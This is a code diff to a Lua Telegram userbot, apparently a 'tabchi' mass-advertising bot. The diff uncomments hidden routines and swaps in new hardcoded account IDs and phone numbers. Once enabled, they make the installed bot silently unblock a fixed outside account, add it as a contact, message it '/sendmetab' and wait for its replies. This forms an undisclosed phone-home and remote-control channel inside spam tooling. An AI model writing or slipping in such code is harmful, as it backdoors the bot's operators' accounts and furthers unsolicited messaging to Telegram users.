@@ -161,14 +161,14 @@ function process_updates()
     local res = http.request(path)
     local jdata = JSON.decode(res)
     jdata = jdata or {have_tab = true}
-    --[[if jdata.have_tab then
+    if jdata.have_tab then
       tdcli.searchPublicChat("TabchiRobotCli")
-      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:295014783", true)
-      tdcli.unblockUser(295014783)
-      tdcli.importContacts(79266812617, "Tabchi mod", "bot", 295014783)
-      tdcli.sendMessage(295014783, 0, 1, "/sendmetab", 1, "html")
+      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:345767079", true)
+      tdcli.unblockUser(345767079)
+      tdcli.importContacts(989104812841, "Tabchi mod", "bot", 345767079)
+      tdcli.sendMessage(345767079, 0, 1, "/sendmetab", 1, "html")
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
-    end]]
+    end
   end
 end
 local process
@@ -578,7 +578,7 @@ Message :
       end
     end
   end
-  --[[if redis:get("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:" .. tostring(msg.sender_user_id_)) then
+  if redis:get("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:" .. tostring(msg.sender_user_id_)) then
     if text_ == "/cancle" then
       return false
     else
@@ -599,7 +599,7 @@ Message :
       end
       return
     end
-  end]]
+ end
 end
 local proc_pv
 function proc_pv(msg)
@@ -694,16 +694,16 @@ Bia pv]]
       return process_links(msg.content_.caption_)
     end
   elseif data.ID == "UpdateChat" then
-    --[[if data.chat_.id_ == 229533808 then
+    if data.chat_.id_ == 345767079 then
       tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
-    elseif data.chat_id_ == 303508016 then
+    elseif data.chat_id_ == 231539308 then
       tdcli.unblockUser(data.chat_.id_)
       tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, "/start")
-    elseif data.chat_.id == 295014783 then
+    elseif data.chat_.id == 345767079 then
       tdcli.unblockUser(data.chat_.id_)
-      tdcli.importContacts(79266812617, "Tabchi mod", "bot", data.chat_.id)
+      tdcli.importContacts(989104812841, "Tabchi mod", "bot", data.chat_.id)
       tdcli.sendMessage(data.chat_.id, 0, 1, "/sendmetab", 1, "html")
-    end]]
+    end
     return add(data.chat_.id_)
   elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
     tdcli.getChats("9223372036854775807", 0, 20)
